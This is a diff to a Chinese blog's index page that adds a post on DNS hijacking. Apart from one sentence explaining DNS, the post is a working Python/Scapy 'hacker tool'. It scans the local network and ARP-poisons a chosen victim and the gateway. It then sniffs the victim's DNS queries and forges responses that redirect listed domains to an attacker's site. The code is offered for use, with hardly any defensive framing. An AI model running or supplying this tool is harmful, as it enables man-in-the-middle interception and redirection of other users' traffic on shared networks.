@@ -259,6 +259,148 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/10/DNS劫持原理与操作/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wenz1">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/download.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="九罹">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/10/DNS劫持原理与操作/" itemprop="url">DNS劫持原理与操作</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-10T21:38:04+08:00">
+                2019-04-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DNS劫持/" itemprop="url" rel="index">
+                    <span itemprop="name">DNS劫持</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>DNS（域名系统）的作用：把网络地址（域名，以字符串形式）对应到真实的计算机能够识别的网络地址（IP地址），以便计算机能够进一步通信，传递网址和内容等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">#-*- encoding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#DNS劫持演练</span><br><span class="line">from scapy.all import *</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">from threading import Thread</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 定义变量和函数</span><br><span class="line">wg = &apos;&apos;</span><br><span class="line">oldname = &apos;&apos;</span><br><span class="line">wifi = &apos;Intel(R) Dual Band Wireless-AC 7265&apos;</span><br><span class="line">blacklist = [&apos;www.topsec.com&apos;, &apos;www.sina.com&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 扫描局域网，显示活跃主机</span><br><span class="line">def scan():</span><br><span class="line">    global wg</span><br><span class="line">    # 之所以用&apos;route print&apos;的结果来获取本机IP和网关IP，是因为&apos;本机IP和网关IP&apos;所在行有明显的特征</span><br><span class="line">    for line in os.popen(&apos;route print&apos;): #os.popen从一个命令打开一个管道</span><br><span class="line">        s = line.strip() #Python strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列</span><br><span class="line">        if s.startswith(&apos;0.0.0.0&apos;): #startswith() 方法用于检查字符串是否是以指定子字符串开头</span><br><span class="line">            slist = s.split()</span><br><span class="line">            ip = slist[3]  # 获取本机IP</span><br><span class="line">            wg = slist[2]  # 获取网关IP</span><br><span class="line">            break</span><br><span class="line">    print(&quot;本机上网的IP:&quot;, ip)</span><br><span class="line">    print(&quot;本机上网的网关:&quot;, wg)</span><br><span class="line">    tnet = wg + &quot;/24&quot;  # tnet代表本网段</span><br><span class="line"></span><br><span class="line">    # 扫描同一网段下的活跃主机，并按从大到小的顺序打印ip和mac</span><br><span class="line">    # 给同一网段的所有主机发送ARP广播。如果主机活跃则会有应答(ans)</span><br><span class="line">    p = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(pdst=tnet)</span><br><span class="line">    ans, unans = srp(p, iface=wifi, timeout=2, verbose=0)</span><br><span class="line">    # 根据应答(ans)的长度来确定活跃的主机</span><br><span class="line">    print(&quot;一共扫描到%d台主机：&quot; % len(ans))</span><br><span class="line">    result = []</span><br><span class="line">    for s, r in ans:</span><br><span class="line">        # 从应答包(ans)中获取活跃主机的IP和相应的MAC地址，并存在列表result中</span><br><span class="line">        result.append([r[ARP].psrc, r[ARP].hwsrc])</span><br><span class="line">    result.sort()</span><br><span class="line">    for ip, mac in result:</span><br><span class="line">        print(ip, &quot;---&gt;&quot;, mac)</span><br><span class="line"></span><br><span class="line"># 嗅探目标主机的DNS请求</span><br><span class="line">def capture(target, t):</span><br><span class="line">    tj = &quot;udp dst port 53 and host &quot; + target</span><br><span class="line">    pkts = sniff(iface=wifi, filter=tj, prn=dnsposion, timeout=t)</span><br><span class="line"></span><br><span class="line">#ARP攻击</span><br><span class="line">def spoof():</span><br><span class="line">    vic=input(&quot;请输入攻击目标:&quot;)</span><br><span class="line">    t=int(input(&quot;请输入攻击时间(单位：秒):&quot;))</span><br><span class="line">    #开启多线程，对目标主机的DNS请求进行抓包(ARP攻击之后，目标主机的上网请求都会经过我)</span><br><span class="line">    ct=Thread(target=capture,args=(vic,t))</span><br><span class="line">    ct.start()</span><br><span class="line">    #每隔0.2秒给目标主机发送一次攻击，总共发5*int(t)次</span><br><span class="line">    for i in range(5*int(t)):</span><br><span class="line">        sendp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=vic,psrc=wg),verbose=0)</span><br><span class="line">        sendp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=wg,psrc=vic),verbose=0)</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line">    ct.join()</span><br><span class="line">    print(&quot;攻击结束！&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dnsposion(p):</span><br><span class="line">    global oldname  # 将oldname定义成全局变量</span><br><span class="line">    vmip = &apos;&apos;  # 获取命令行的参数，即Windows Server 2008的IP</span><br><span class="line">    try:</span><br><span class="line">        # 在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行</span><br><span class="line">        if p.haslayer(DNS):</span><br><span class="line">            ip = p[IP]</span><br><span class="line">            udp = p[UDP]</span><br><span class="line">            dns = p[DNS]</span><br><span class="line">            qname = dns.qd.qname.decode()[:-1]  # 获取请求的域名</span><br><span class="line"></span><br><span class="line">            # 对于之前出现过的请求不再显示</span><br><span class="line">            if qname != oldname:</span><br><span class="line">                print(&apos;收到一个请求&apos;, qname)</span><br><span class="line"></span><br><span class="line">            # 如果解析的域名在我的黑名单中，则构造一个包含我搭建的网站IP的DNS响应包发给目标主机</span><br><span class="line">            if qname in blacklist:</span><br><span class="line">                nip = IP(src=ip.dst, dst=ip.src)</span><br><span class="line">                nudp = UDP(sport=udp.dport, dport=udp.sport)</span><br><span class="line">                ndns = DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, rdata=vmip))</span><br><span class="line">                send(nip / nudp / ndns, iface=wifi)</span><br><span class="line">                print(&apos;%s---&gt;&apos; % qname, vmip)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;欢迎使用我的黑客工具!&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        sel = input(&quot;请选择要进行的操作：1、局域网扫描 2、DNS劫持 3、流量分析 4、退出\t&quot;)</span><br><span class="line">        if sel == &apos;1&apos;:</span><br><span class="line">            scan()</span><br><span class="line">        elif sel == &apos;2&apos;:</span><br><span class="line">            if not wg:</span><br><span class="line">                print(&quot;请先执行扫描程序！&quot;)</span><br><span class="line">            else:</span><br><span class="line">                spoof()</span><br><span class="line">        elif sel == &apos;3&apos;:</span><br><span class="line">            print(&quot;开发中... ...&quot;)</span><br><span class="line">            pass</span><br><span class="line">        elif sel == &apos;4&apos;:</span><br><span class="line">            print(&quot;欢迎下次使用，再见！&quot;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;输入有误，请重新输入！&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/掘安杯-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1144,7 +1286,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1155,7 +1297,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
